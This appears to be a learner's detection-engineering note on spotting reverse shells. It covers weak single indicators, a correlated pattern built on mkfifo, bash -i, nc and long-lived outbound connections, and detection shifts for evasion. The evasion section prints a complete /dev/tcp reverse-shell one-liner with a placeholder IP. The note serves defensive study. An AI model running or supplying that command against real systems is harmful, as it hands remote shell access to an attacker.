# Detection Engineering Reflection – Day 02

## Weak Single Indicators

| Indicator | Why Insufficient Alone |
| :-------- | :--------------------- |
| `nc` execution | Could be benign testing |
| High outbound port | Common for many services |
| Named pipe in `/tmp` | Used for legitimate IPC |
| `bash -i` | Common for admin activity |

---

## Strong Correlated Detection

High-confidence reverse shell pattern includes:
- `mkfifo` in `/tmp`
- `bash -i` invocation
- `nc` execution
- Outbound ESTAB to non-standard port
- Long-lived interactive session
- Non-root user

Detection should prioritize behavior correlation over port-based rules.

---

## Evasion Consideration

If attacker uses:

```bash
bash -i >& /dev/tcp/<ip>/443 0>&1
```
Detection must shift to:

- Shell making outbound network connections
- Long-lived ESTAB to uncommon IP
- Parent-child shell chain anomalies